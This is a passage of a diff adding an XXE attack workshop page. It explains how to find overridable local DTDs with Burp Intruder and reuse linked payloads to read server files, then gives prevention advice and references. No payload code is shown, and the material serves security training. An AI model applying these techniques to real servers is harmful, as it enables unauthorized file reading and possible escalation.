+<p class="image-container"><img alt="Request to intruder prefix suffix" src="img\1021a8a800f875a7.png"></p>
+<h3 is-upgraded>Filtering attempt</h3>
+<p>Once Intruder is done with the brute force attack, we can filter result with a negative search.</p>
+<p class="image-container"><img alt="Intruder filter" src="img\625a3ae59b531c6f.png"></p>
+<p>Intruder is not showing the initial value from our list, but the final value encoded. For this reason, we need to decode the path from the request.</p>
+<p class="image-container"><img alt="Intruder result decoding url" src="img\fe98a4ab6aaef2b8.png"></p>
+<h3 is-upgraded>Using the DTD found</h3>
+<p>Once a DTD with a known <em>overridable</em> entity is found, we can start to poke at files to exfiltrate.</p>
+<p>You can reuse a XXE payload from <a href="https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md" target="_blank">this list</a>. Only the <code>file</code> entity need to be change. The path to the DTD (<code>local_dtd</code>) and the dummy path (<code>/nonexistant</code>) will be unmodified.</p>
+<p class="image-container"><img alt="File content received" src="img\4a2c15997e4e507a.png"></p>
+<p>You can view the complete attack in this video.</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Conclusion" duration="1">
+        <p>Misconfigured XML parser can open doors to attackers. Being able to read files on the vulnerable server is the main consern. But as you saw in this workshop, being able to read key files can lead to escalating to remote command execution.</p>
+<p>From a developper perspective, you can prevent such issue by configuring properly the XML parser in used in your application. Few librairies have secure configuration by default but it is best to verify with a reference such as the OWASP Cheat Sheet in the reference below.</p>
+<h2 is-upgraded>References</h2>
+<ul>
+<li><a href="http://www.agarri.fr/kom/archives/2013/11/27/compromising_an_unreachable_solr_server_with_cve-2013-6397/index.html" target="_blank">Example with jar: protocol trick</a></li>
+<li><a href="http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html" target="_blank">Example of simple payload and out-of-bound</a></li>
+<li><a href="http://vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf" target="_blank">XML Schema, DTD, and Entity Attacks</a></li>
+<li><a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html" target="_blank">More examples (Huge list of payload variations)</a></li>
+<li><a href="https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi" target="_blank">XXE: How to become a Jedi</a> Many exploitation tips</li>
+<li><a href="https://www.owasp.org/images/3/30/XXE_-_The_Anatomy_of_an_XML_Attack_-_Mike_Felch.pdf" target="_blank">XXE: The Anatomy of an XML Attack</a>: Good presentation (list of protocols taken from this one)</li>
+<li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet" target="_blank">OWASP: XML External Entity Prevention Cheat Sheet</a></li>
+</ul>
+
+
+      </google-codelab-step>
+    
+  </google-codelab>
+
+  <script src="https://storage.googleapis.com/codelab-elements/native-shim.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/custom-elements.min.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/prettify.js"></script>
+  <script src="https://storage.googleapis.com/codelab-elements/codelab-elements.js"></script>
+
+</body>
+</html>
